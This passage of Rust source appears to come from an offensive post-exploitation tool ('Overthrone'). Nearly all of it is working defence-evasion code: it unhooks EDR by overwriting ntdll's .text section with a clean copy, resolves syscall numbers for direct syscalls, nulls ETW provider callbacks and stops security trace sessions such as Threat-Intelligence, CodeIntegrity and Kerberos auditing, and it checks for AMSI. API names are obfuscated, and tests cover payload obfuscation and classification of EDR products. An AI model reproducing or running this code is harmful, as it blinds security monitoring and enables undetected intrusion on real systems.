            + 4
            + std::mem::size_of::<image::IMAGE_FILE_HEADER>()
            + nt.FileHeader.SizeOfOptionalHeader as usize;

        let mut clean_section_offset = clean_bytes.as_ptr() as usize
            + clean_dos.e_lfanew as usize
            + 4
            + std::mem::size_of::<image::IMAGE_FILE_HEADER>()
            + clean_nt.FileHeader.SizeOfOptionalHeader as usize;

        for _ in 0..num_sections {
            let section = &*(section_offset as *const image::IMAGE_SECTION_HEADER);
            let clean_section = &*(clean_section_offset as *const image::IMAGE_SECTION_HEADER);

            let name = std::str::from_utf8(&section.Name).unwrap_or("");
            let name_trimmed = name.trim_end_matches('\0');

            if name_trimmed == ".text" {
                let current_addr = ntdll_base + section.VirtualAddress as usize;
                let clean_addr =
                    clean_bytes.as_ptr() as usize + clean_section.VirtualAddress as usize;
                let size = section.SizeOfRawData as usize;

                if clean_addr + size > clean_bytes.as_ptr() as usize + clean_bytes.len() {
                    result.errors.push(format!(
                        "Clean .text ({}..{}) exceeds mapped buffer size {}",
                        clean_addr,
                        clean_addr + size,
                        clean_bytes.len()
                    ));
                    return Ok(result);
                }

                let current_first = std::slice::from_raw_parts(current_addr as *const u8, 8);
                let clean_first = std::slice::from_raw_parts(clean_addr as *const u8, 8);
                let mut changes = false;
                for j in 0..8 {
                    if current_first[j] != clean_first[j] {
                        changes = true;
                        break;
                    }
                }

                if !changes {
                    info!("NtDll .text is clean -- no hooks detected");
                    result.success = true;
                    return Ok(result);
                }

                let mut old_prot: PAGE_PROTECTION_FLAGS = PAGE_PROTECTION_FLAGS(0);
                if VirtualProtect(
                    current_addr as *mut _,
                    size,
                    PAGE_EXECUTE_READWRITE,
                    &mut old_prot,
                )
                .is_err()
                {
                    result
                        .errors
                        .push("VirtualProtect on .text failed".to_string());
                    return Ok(result);
                }

                std::ptr::copy_nonoverlapping(
                    clean_addr as *const u8,
                    current_addr as *mut u8,
                    size,
                );

                let _ = VirtualProtect(
                    current_addr as *mut _,
                    size,
                    old_prot,
                    &mut PAGE_PROTECTION_FLAGS(0),
                );

                // Flush instruction cache via ntdll to avoid import dependency
                type NtFlushInstructionCache = unsafe extern "system" fn(
                    *mut std::ffi::c_void,
                    *const std::ffi::c_void,
                    usize,
                ) -> i32;
                if let Some(flush_addr) = windows::Win32::System::LibraryLoader::GetProcAddress(
                    ntdll,
                    windows::core::PCSTR(crate::xs!("NtFlushInstructionCache").as_bytes().as_ptr()),
                ) {
                    let nt_flush: NtFlushInstructionCache = std::mem::transmute(flush_addr);
                    nt_flush(std::ptr::null_mut(), current_addr as *const _, size);
                }

                result.functions_restored = 1;
                result.first_hook_name = Some(format!(".text section ({} bytes)", size));
                info!("NtDll unhook: restored .text section ({} bytes)", size);
                break;
            }

            section_offset += section_size;
            clean_section_offset += section_size;
        }
    }

    result.success = result.functions_restored > 0;
    Ok(result)
}

#[cfg(target_os = "windows")]
fn resolve_clean_syscall_numbers_impl() -> Result<HashMap<String, u32>> {
    use crate::postex::opsec::image;

    let clean_bytes = map_clean_ntdll_section()?;

    unsafe {
        let base = clean_bytes.as_ptr() as usize;

        let dos = &*(base as *const image::IMAGE_DOS_HEADER);
        let nt = &*((base + dos.e_lfanew as usize) as *const image::IMAGE_NT_HEADERS64);

        let export_dir = nt.OptionalHeader.DataDirectory[image::IMAGE_DIRECTORY_ENTRY_EXPORT];
        let export_base = base + export_dir.VirtualAddress as usize;
        let export_table = &*(export_base as *const image::IMAGE_EXPORT_DIRECTORY);

        let functions = std::slice::from_raw_parts(
            (base + export_table.AddressOfFunctions as usize) as *const u32,
            export_table.NumberOfFunctions as usize,
        );
        let names = std::slice::from_raw_parts(
            (base + export_table.AddressOfNames as usize) as *const u32,
            export_table.NumberOfNames as usize,
        );
        let ordinals = std::slice::from_raw_parts(
            (base + export_table.AddressOfNameOrdinals as usize) as *const u16,
            export_table.NumberOfNames as usize,
        );

        let mut syscall_map = HashMap::new();

        for i in 0..export_table.NumberOfNames as usize {
            let name_ptr = base + names[i] as usize;
            let name = std::ffi::CStr::from_ptr(name_ptr as *const i8)
                .to_str()
                .unwrap_or("");

            if !name.starts_with("Nt") {
                continue;
            }

            let ordinal = ordinals[i] as usize;
            if ordinal >= functions.len() {
                continue;
            }

            let func_rva = functions[ordinal];
            let func_ptr = base + func_rva as usize;

            let code = std::slice::from_raw_parts(func_ptr as *const u8, 8);

            // Pattern 1: `mov eax, SSN` at offset 0 (direct)
            if code.len() >= 5 && code[0] == 0xB8 {
                let ssn = u32::from_le_bytes([code[1], code[2], code[3], code[4]]);
                syscall_map.insert(name.to_string(), ssn);
                continue;
            }

            // Pattern 2: `mov r10, rcx; mov eax, SSN` at offset 3
            if code.len() >= 8
                && code[0] == 0x4C
                && code[1] == 0x8B
                && code[2] == 0xD1
                && code[3] == 0xB8
            {
                let ssn = u32::from_le_bytes([code[4], code[5], code[6], code[7]]);
                syscall_map.insert(name.to_string(), ssn);
                continue;
            }
        }

        info!(
            "Resolved {} clean syscall numbers from disk ntdll",
            syscall_map.len()
        );
        Ok(syscall_map)
    }
}

#[cfg(target_os = "windows")]
fn abolish_etw_providers_impl() -> Result<EtwAbolitionResult> {
    let mut result = EtwAbolitionResult {
        providers_nulled: 0,
        trace_sessions_disabled: 0,
        success: false,
        errors: Vec::new(),
    };

    unsafe {
        // Method 1: Patch EtwEventWrite in ntdll (basic suppression)
        // This is already done by opsec::suppress_etw(), so we add advanced techniques

        // Method 2: Walk the ETW provider registration list
        // NtQueryInformationProcess with ProcessEtwInformation class (0x25)
        // Then nullify callback pointers in each registration

        type NtQueryInformationProcess = unsafe extern "system" fn(
            windows::Win32::Foundation::HANDLE,
            u32,
            *mut std::ffi::c_void,
            u32,
            *mut u32,
        ) -> i32;

        let ntdll = windows::Win32::System::LibraryLoader::GetModuleHandleA(windows::core::PCSTR(
            crate::xs!("ntdll.dll").as_bytes().as_ptr(),
        ))
        .map_err(|e| OverthroneError::PostExploitation(format!("GetModuleHandleA: {e}")))?;

        let ntqip = {
            let ptr = windows::Win32::System::LibraryLoader::GetProcAddress(
                ntdll,
                windows::core::PCSTR(crate::xs!("NtQueryInformationProcess").as_bytes().as_ptr()),
            );
            ptr.ok_or_else(|| {
                OverthroneError::PostExploitation(
                    "GetProcAddress NtQueryInformationProcess failed".into(),
                )
            })?
        };
        let ntqip: NtQueryInformationProcess = std::mem::transmute(ntqip);
        let current_process =
            windows::Win32::Foundation::HANDLE((-1isize) as *mut std::ffi::c_void);

        let etw_info_class: u32 = 0x25;
        let mut buf_size: u32 = 0;
        let status = ntqip(
            current_process,
            etw_info_class,
            std::ptr::null_mut(),
            0,
            &mut buf_size,
        );

        if status != 0 && buf_size == 0 {
            result
                .errors
                .push("NtQueryInformationProcess with ProcessEtwInformation not supported".into());
            result.trace_sessions_disabled = disable_etw_trace_sessions();
            result.success = result.trace_sessions_disabled > 0;
            return Ok(result);
        }

        let mut buffer: Vec<u8> = vec![0u8; buf_size as usize];
        let mut returned: u32 = 0;

        let status = ntqip(
            current_process,
            etw_info_class,
            buffer.as_mut_ptr() as *mut _,
            buf_size,
            &mut returned,
        );

        if status != 0 {
            result.errors.push(format!(
                "NtQueryInformationProcess returned status: {}",
                status
            ));
            // Fallback
            result.trace_sessions_disabled = disable_etw_trace_sessions();
            result.success = result.trace_sessions_disabled > 0;
            return Ok(result);
        }

        // Walk the returned ETW registration list
        // Structure: list of ETW registration entries
        // Each entry has a callback pointer at a known offset we need to nullify
        // The exact layout depends on Windows version but is generally stable
        let ptr = buffer.as_ptr();
        let len = returned as usize;

        // Try to find and nullify provider callbacks
        // ETW registration entries contain pointers to callback functions
        // We search for patterns and null them out
        let mut nulled = 0u32;
        let mut offset: usize = 0;

        while offset + 256 <= len {
            // Look for potential callback pointers in the region
            for check_offset in (0..len - 8).step_by(8) {
                let potential_ptr: *const usize = ptr.add(check_offset) as *const usize;
                let ptr_value = *potential_ptr;

                // Check if the pointer looks like a valid callback (code section address)
                if ptr_value > 0x7F0000000000 && ptr_value < 0x800000000000 {
                    // Read the byte at this address - if it's a valid code byte (0x48 = REX or 0xCC = int3, etc)
                    // This is heuristic but helps avoid nullifying random pointers
                    let potential_code: *const u8 = ptr_value as *const u8;
                    let first_byte = *potential_code;

                    // Common function prologue bytes
                    if first_byte == 0x48
                        || first_byte == 0x4C
                        || first_byte == 0x40
                        || first_byte == 0x55  // push rbp
                        || first_byte == 0xE9
                    // jmp (trampoline)
                    {
                        // Nullify the callback pointer
                        let null_dest: *mut usize = ptr.add(check_offset) as *mut usize;
                        *null_dest = 0;
                        nulled += 1;

                        if nulled > 50 {
                            // Safety limit - don't go too far
                            break;
                        }
                    }
                }
            }
            offset += 256;
        }

        result.providers_nulled = nulled as usize;
        result.trace_sessions_disabled = disable_etw_trace_sessions();
        info!(
            "ETW abolition: nulled {} provider callbacks, disabled {} trace sessions",
            result.providers_nulled, result.trace_sessions_disabled
        );
    }

    result.success = result.providers_nulled > 0 || result.trace_sessions_disabled > 0;
    Ok(result)
}

#[cfg(target_os = "windows")]
fn disable_etw_trace_sessions() -> usize {
    // Registry imports available for ETW session management

    // Disable ETW trace sessions by setting the registry key
    // HKLM\SYSTEM\CurrentControlSet\Control\WMI\Autologger\ to disabled state
    // This prevents ETW autologger sessions from starting
    let mut disabled = 0usize;

    unsafe {
        // Use NtQuerySystemInformation with SystemPerformanceTraceInformation (class 0x16)
        // to enumerate and stop ETW trace sessions via the documented API
        type NtQuerySystemInformation =
            unsafe extern "system" fn(u32, *mut std::ffi::c_void, u32, *mut u32) -> i32;

        let ntdll = match windows::Win32::System::LibraryLoader::GetModuleHandleA(
            windows::core::PCSTR(crate::xs!("ntdll.dll").as_bytes().as_ptr()),
        ) {
            Ok(m) => m,
            Err(_) => return 0,
        };

        let ntqsi = windows::Win32::System::LibraryLoader::GetProcAddress(
            ntdll,
            windows::core::PCSTR(crate::xs!("NtQuerySystemInformation").as_bytes().as_ptr()),
        );
        let ntqsi = match ntqsi {
            Some(p) => std::mem::transmute::<
                unsafe extern "system" fn() -> isize,
                NtQuerySystemInformation,
            >(p),
            None => return 0,
        };

        // SystemPerformanceTraceInformation = 0x16
        let mut buf_size: u32 = 0;
        ntqsi(0x16, std::ptr::null_mut(), 0, &mut buf_size);
        if buf_size == 0 {
            return 0;
        }
        buf_size += 65536;
        let mut buf: Vec<u8> = vec![0u8; buf_size as usize];
        let mut returned: u32 = 0;

        let status = ntqsi(0x16, buf.as_mut_ptr() as *mut _, buf_size, &mut returned);
        if status != 0 {
            return 0;
        }

        // Walk the trace session entries and stop each one
        // SystemPerformanceTraceInformation returns an array of TRACE_SESSION_INFO structures
        // We disable through the standard API by finding and stopping trace sessions
        // For stealth, we use NtControlTrace directly:
        type NtControlTrace = unsafe extern "system" fn(
            u32,      // ControlType: 0 = Stop, 1 = Query, 2 = Update, 3 = Flush
            *mut u16, // SessionName
            *mut u8,  // Properties
            u32,      // PropertiesLength
        ) -> i32;

        let ntct = windows::Win32::System::LibraryLoader::GetProcAddress(
            ntdll,
            windows::core::PCSTR(crate::xs!("NtControlTrace").as_bytes().as_ptr()),
        );
        let ntct = match ntct {
            Some(p) => {
                std::mem::transmute::<unsafe extern "system" fn() -> isize, NtControlTrace>(p)
            }
            None => return 0,
        };

        // Known ETW trace session names to disable
        let known_sessions = [
            "Circular Kernel Context Logger",
            "Microsoft-Windows-Rdp-Graphics-Rdpavs-Debug",
            "Microsoft-Windows-CodeIntegrity",
            "Microsoft-Windows-Kernel-Audit-API-Calls",
            "Microsoft-Windows-Security-Netlogon",
            "Microsoft-Windows-SmartCard-Audit",
            "Microsoft-Windows-SystemEventBroker",
            "Microsoft-Windows-Windows Firewall",
            "Microsoft-Windows-Threat-Intelligence",
            "Microsoft-Windows-AppLocker",
            "Microsoft-Windows-Kernel-Memory",
            "Microsoft-Windows-CAPI2",
            "Microsoft-Windows-DNS-Client",
            "Microsoft-Windows-LDAP-Client",
            "Microsoft-Windows-Kerberos-Network",
            "Microsoft-Windows-Kernel-Process",
            "Microsoft-Windows-Kernel-Thread",
            "Microsoft-Windows-Kernel-General",
            "Microsoft-Windows-Kernel-Network",
        ];

        for session_name in &known_sessions {
            let name_utf16: Vec<u16> = session_name.encode_utf16().collect();
            let mut properties = vec![0u8; 1024];

            // EVENT_TRACE_PROPERTIES layout:
            // Wnode(BufferSize, ...), BufferSize, MinimumBuffers, etc.
            let props = properties.as_mut_ptr() as *mut u32;
            *props = 1024u32; // Wnode.BufferSize
            *(props.add(12)) = 0u32; // LoggerNameOffset = 0
            *(props.add(13)) = 0u32; // LogFileNameOffset = 0

            // EVENT_TRACE_CONTROL_STOP = 0
            let ctl_status = ntct(
                0,
                name_utf16.as_ptr() as *mut u16,
                properties.as_mut_ptr(),
                properties.len() as u32,
            );
            if ctl_status == 0 {
                disabled += 1;
            }
        }
    }

    disabled
}

#[cfg(target_os = "windows")]
fn check_etw_amsi_state() -> (bool, bool) {
    let etw_active = unsafe {
        use windows::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress};
        match GetModuleHandleA(windows::core::PCSTR(
            crate::xs!("ntdll.dll").as_bytes().as_ptr(),
        )) {
            Ok(m) => GetProcAddress(
                m,
                windows::core::PCSTR(crate::xs!("EtwEventWrite").as_bytes().as_ptr()),
            )
            .is_some(),
            Err(_) => false,
        }
    };

    let amsi_loaded = unsafe {
        use windows::Win32::System::LibraryLoader::GetModuleHandleA;
        GetModuleHandleA(windows::core::PCSTR(
            crate::xs!("amsi.dll").as_bytes().as_ptr(),
        ))
        .is_ok()
    };

    (etw_active, amsi_loaded)
}

/// Classify a hook by examining the patched bytes.
#[cfg(target_os = "windows")]
fn classify_hook(bytes: &[u8; 8]) -> String {
    // JMP [RIP+offset] -- typical EDR inline hook
    if bytes[0] == 0xFF && bytes[1] == 0x25 {
        return "inline_hook_jmp_rip_relative".to_string();
    }
    // JMP rel32 -- direct jump to hook
    if bytes[0] == 0xE9 {
        return "inline_hook_jmp_rel32".to_string();
    }
    // CALL rel32
    if bytes[0] == 0xE8 {
        return "inline_hook_call_rel32".to_string();
    }
    // INT3 (debugger breakpoint)
    if bytes[0] == 0xCC {
        return "debug_breakpoint".to_string();
    }
    // MOV RAX, addr; JMP RAX -- detour via register
    if bytes[0] == 0x48 && bytes[1] == 0xB8 {
        return "detour_hook_mov_rax_jmp_rax".to_string();
    }
    // PUSH imm64; RET -- push hook address, return to it
    if bytes[0] == 0x68 || bytes[0] == 0x6A {
        return "push_ret_hook".to_string();
    }
    // Generic modified
    "custom_hook".to_string()
}

// ----------------------------------------------------------------------
//  PE image section header (local definition for scan_ntdll_hooks_impl)
// ----------------------------------------------------------------------

#[cfg(target_os = "windows")]
#[allow(non_camel_case_types, non_snake_case, dead_code)]
#[repr(C)]
struct IMAGE_SECTION_HEADER {
    Name: [u8; 8],
    VirtualSize: u32,
    VirtualAddress: u32,
    SizeOfRawData: u32,
    PointerToRawData: u32,
    PointerToRelocations: u32,
    PointerToLinenumbers: u32,
    NumberOfRelocations: u16,
    NumberOfLinenumbers: u16,
    Characteristics: u32,
}

// ----------------------------------------------------------------------
//  Tests
// ----------------------------------------------------------------------

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_obfuscate_roundtrip() {
        let original = b"Overthrone secret payload data for testing";
        let mut buf = original.to_vec();
        let key = b"testkey12345";

        obfuscate_memory(&mut buf, key);
        assert_ne!(&buf[..], &original[..]);

        deobfuscate_memory(&mut buf, key);
        assert_eq!(&buf[..], &original[..]);
    }

    #[test]
    fn test_obfuscate_empty_key() {
        let mut buf = vec![0x41u8; 10];
        let original = buf.clone();
        obfuscate_memory(&mut buf, &[]);
        assert_eq!(buf, original);
    }

    #[cfg(target_os = "windows")]
    #[test]
    fn test_edr_product_classification() {
        assert_eq!(classify_edr_process("csagent.exe"), EdrProduct::CrowdStrike);
        assert_eq!(
            classify_edr_process("sentinelagent.exe"),
            EdrProduct::SentinelOne
        );
        assert_eq!(
            classify_edr_process("msmpeng.exe"),
            EdrProduct::MicrosoftDefender
        );
        assert_eq!(
            classify_edr_process("cbdefense.exe"),
            EdrProduct::CarbonBlack
        );
        assert_eq!(classify_edr_process("notan-edr.exe"), EdrProduct::Unknown);
    }

    #[test]
    fn test_sleep_mask_config_default() {
        let cfg = SleepMaskConfig::default();
        assert_eq!(cfg.interval_ms, 5000);
        assert!(cfg.obfuscate_heap);
    }

    #[test]
    fn test_evasion_strategy_display() {
        assert_eq!(EvasionStrategy::None.to_string(), "No evasion needed");
        assert_eq!(
            EvasionStrategy::FullUnhook.to_string(),
            "Full ntdll unhook + indirect syscalls"
        );
    }

    #[cfg(target_os = "windows")]
    #[test]
    fn test_classify_hook_known_patterns() {
        let mut jmp = [0u8; 8];
        jmp[0] = 0xE9;
        assert_eq!(classify_hook(&jmp), "inline_hook_jmp_rel32");

        let mut call = [0u8; 8];
        call[0] = 0xE8;
        assert_eq!(classify_hook(&call), "inline_hook_call_rel32");

        let mut int3 = [0u8; 8];
        int3[0] = 0xCC;
        assert_eq!(classify_hook(&int3), "debug_breakpoint");

        let clean = [0x4Cu8, 0x8B, 0xD1, 0xB8, 0x00, 0x00, 0x00, 0x00];
        assert_eq!(classify_hook(&clean), "custom_hook");
    }

    #[test]
    fn test_assessment_default_fields() {
        let hooks = HookDetection {
            function_name: "NtOpenProcess".into(),
            syscall_number: 0x26,
            clean_bytes: [0u8; 8],
            current_bytes: [0xE9, 0, 0, 0, 0, 0, 0, 0],
            hooked: true,
            hook_type: "inline_hook_jmp_rel32".into(),
        };
        assert!(hooks.hooked);
        assert_eq!(hooks.function_name, "NtOpenProcess");
    }

    #[test]
    fn test_unhook_result_default() {
        let r = UnhookResult {
            functions_restored: 3,
            first_hook_name: Some("NtOpenProcess".into()),
            errors: vec![],
            success: true,
        };
        assert!(r.success);
        assert_eq!(r.functions_restored, 3);
    }
}
